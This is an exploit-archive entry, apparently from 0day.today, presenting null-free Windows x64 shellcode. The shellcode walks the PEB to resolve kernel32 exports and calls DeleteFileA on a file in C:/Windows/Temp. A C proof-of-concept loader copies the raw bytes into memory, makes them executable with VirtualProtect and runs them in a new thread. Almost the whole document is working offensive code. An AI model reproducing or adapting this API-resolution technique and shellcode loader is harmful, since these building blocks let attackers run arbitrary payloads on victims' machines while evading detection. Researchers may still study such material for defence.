@@ -1,0 +1,153 @@
+id: 38629
+date: 04/25/2023
+title: Windows/x64 - Delete File shellcode / Dynamic PEB method null-free Shellcode
+author: Nayani
+cves: 
+
+; Name: Windows/x64 - Delete File shellcode / Dynamic PEB method null-free Shellcode
+; Author: Nayani
+; Tested on: Microsoft Windows [Version	10.0.22621 Build 22621]
+
+
+; Description: 
+
+; This an implementation of DeleteFileA Windows api to delete a file in the C:/Windows/Temp/ directory. 
+; To test this code create a file: 
+; echo "test" >> C:/Windows/Temp/test.txt 
+; and then execute the shellcode 
+; This code uses PEB to resolve kernel32 and find the DeleteFileA function. 
+
+
+
+
+
+
+
+sub rsp, 28h
+and rsp, 0fffffffffffffff0h
+
+xor rdi, rdi            
+mul rdi                 
+mov r9, gs:[rax+0x60]  
+mov r9, [r9+0x18]     
+mov r9, [r9+0x20]     
+mov r9, [r9]          
+mov r9, [r9]          
+mov r9, [r9+0x20]     
+mov r8, r9             
+
+; Get kernel32.dll ExportTable Address
+mov r9d, [r9+0x3C]     
+add r9, r8             
+xor rcx, rcx            
+add cx, 0x88ff
+shr rcx, 0x8            
+mov edx, [r9+rcx]      
+add rdx, r8             
+
+; Get &AddressTable from Kernel32.dll ExportTable
+xor r10, r10
+mov r10d, [rdx+0x1C]    
+add r10, r8             
+
+; Get &NamePointerTable from Kernel32.dll ExportTable
+xor r11, r11
+mov r11d, [rdx+0x20]    
+add r11, r8             
+
+; Get &OrdinalTable from Kernel32.dll ExportTable
+xor r12, r12
+mov r12d, [rdx+0x24]    
+add r12, r8             
+
+jmp short name_api
+
+
+getaddr:
+pop r9                
+pop rcx                 
+xor rax, rax            
+mov rdx, rsp             
+push rcx                
+check_loop:
+mov rcx, [rsp]          
+xor rdi,rdi             
+mov edi, [r11+rax*4]    
+add rdi, r8             
+mov rsi, rdx            
+repe cmpsb              
+je resolver           
+incloop:
+inc rax
+jmp short check_loop
+
+
+resolver:
+pop rcx                 
+mov ax, [r12+rax*2]    
+mov eax, [r10+rax*4]   
+add rax, r8            
+push r9               
+ret                    
+
+name_api:                   
+
+; DeleteFileA
+
+xor rcx, rcx
+add cl, 0xC                 
+mov rax, 0x41656CFFFFFFFFFF		;leA
+shr rax, 40
+push rax
+mov rax, 0x69466574656C6544		;DeleteFi
+push rax
+push rcx                    
+call getaddr             
+mov r14, rax                
+
+; Bool DeleteFileA(
+;   LPCSTR lpFileName
+; );
+
+xor rcx, rcx
+mul rcx                     
+push rax                    
+
+mov rax, 0x7478742E74736574
+push rax
+mov rax, 0x2F706D65542F7377 ; ws/temp 
+push rax
+mov rax, 0x6F646E69572F3A43 ; c:/Windo
+push rax                    ; RSP = "test.txt"
+mov rcx, rsp                ; RCX = "test.txt"
+sub rsp, 0x20               
+call r14                    ;Delete File in C:/Windows/Temp/test.txt 
+add rsp, 0x20
+
+
+[!]===================================== POC ========================================= [!]
+
+#include <windows.h>
+
+
+void main() {
+
+  void* exec;
+  BOOL rv;
+  HANDLE th;
+  DWORD oldprotect = 0;
+  
+  
+  unsigned char payload[] = "\x48\x83\xec\x28\x48\x83\xe4\xf0\x48\x31\xff\x48\xf7\xe7\x65\x4c\x8b\x48\x60\x4d\x8b\x49\x18\x4d\x8b\x49\x20\x4d\x8b\x09\x4d\x8b\x09\x4d\x8b\x49\x20\x4d\x89\xc8\x45\x8b\x49\x3c\x4d\x01\xc1\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x41\x8b\x14\x09\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x34\x41\x59\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04\x82\x4c\x01\xc0\x41\x51\xc3\x48\x31\xc9\x80\xc1\x0c\x48\xb8\xff\xff\xff\xff\xff\x6c\x65\x41\x48\xc1\xe8\x28\x50\x48\xb8\x44\x65\x6c\x65\x74\x65\x46\x69\x50\x51\xe8\xa6\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x74\x65\x73\x74\x2e\x74\x78\x74\x50\x48\xb8\x77\x73\x2f\x54\x65\x6d\x70\x2f\x50\x48\xb8\x43\x3a\x2f\x57\x69\x6e\x64\x6f\x50\x48\x89\xe1\x48\x83\xec\x20\x41\xff\xd6\x48\x83\xc4\x20";
+    
+    
+  unsigned int payload_len = 500;
+  exec = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+  RtlMoveMemory(exec, payload, payload_len);
+  rv = VirtualProtect(exec, payload_len, PAGE_EXECUTE_READ, &oldprotect);
+  th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec, 0, 0, 0);
+  WaitForSingleObject(th, -1);
+
+}
+
+#  0day.today [2023-05-01]  #
